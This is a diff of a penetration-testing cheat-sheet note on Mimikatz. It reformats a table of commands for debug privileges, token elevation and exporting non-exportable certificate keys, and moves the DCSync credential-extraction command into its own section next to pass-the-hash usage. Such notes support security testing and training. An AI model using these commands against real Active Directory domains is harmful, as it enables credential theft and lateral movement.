@@ -39,14 +39,13 @@ Available modules: <https://github.com/gentilkiwi/mimikatz/wiki#modules>
 
 ## Common commands:
 
-| Command                                        | Purpose                                                                                     |
-| ---------------------------------------------- | ------------------------------------------------------------------------------------------- |
-| `log <path>`                                   | write output to file                                                                        |
-| `privilege::debug`                             | enable debugging privileges                                                                 |
-| `token::elevate`                               | elevate privileges                                                                          |
-| `misc::cmd`                                    | launch new cmd instance with current context                                                |
-| `crypto::capi`<br>or `crypto::cng`             | make non-exportable private keys from certificates exportable                               |
-| `lsadump::dcsync /user:<domain>\<target_user>` | perform [[2 Tech-Specifics/Active Directory/Lateral Movement/dcsync Attack\|dcsync Attack]] |
+| Command                            | Purpose                                                                              |
+| ---------------------------------- | ------------------------------------------------------------------------------------ |
+| `log <path>`                       | write output to file                                                                 |
+| `privilege::debug`                 | enable debugging privileges                                                          |
+| `token::elevate`                   | elevate privileges                                                                   |
+| `misc::cmd`                        | launch new cmd instance with current context                                         |
+| `crypto::capi`<br>or `crypto::cng` | make non-exportable private keys from certificates exportable                        |
 
 ## Extract password hashes
 
@@ -130,3 +129,11 @@ sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<ntlm_hash> /run:<command>
 ```
 
 E.g. run `powershell` as command. Note: When running `whoami` from the new powershell process, it will still show the "old" user you started the escalation from.
+
+## DCSync Attack
+
+See: [[2 Tech-Specifics/Active Directory/Lateral Movement/dcsync|dcsync]]
+
+Extract credentials of a target user:
+
+`lsadump::dcsync /user:<domain>\<target_user>`
